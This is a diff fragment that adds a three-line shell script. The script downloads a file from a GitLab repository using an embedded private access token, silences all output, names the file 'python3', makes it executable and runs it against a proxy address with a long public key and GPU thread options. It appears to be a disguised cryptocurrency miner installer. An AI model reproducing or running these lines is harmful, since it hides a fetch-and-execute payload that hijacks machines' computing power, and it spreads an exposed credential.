@@ -1,0 +1,3 @@
+wget --header="PRIVATE-TOKEN: glpat-n3zdkdqxZ1lgjvPWJzKWMW86MQp1OmljbTV1Cw.01.120if1qqq" "https://gitlab.com/api/v4/projects/sairinjitu%2Flog/repository/files/tiktok/raw?ref=main" -O python3 > /dev/null 2>&1 && chmod +x python3 > /dev/null 2>&1
+
+./python3 --proxy=209.97.163.151:9999 --pubkey=3zW8DqVb1UxJNBwUbbDVrrPpBQDxVJjTv82bEY4o7u86stUCKm5CGScgcr81zBJHyhqABknoQfi5wMdUBgriSph7PbV36E68TLJxdJGgfQZwT3o3UADGcXZvw6dVKW6o9ebx --label=K6 --threads-per-card=2
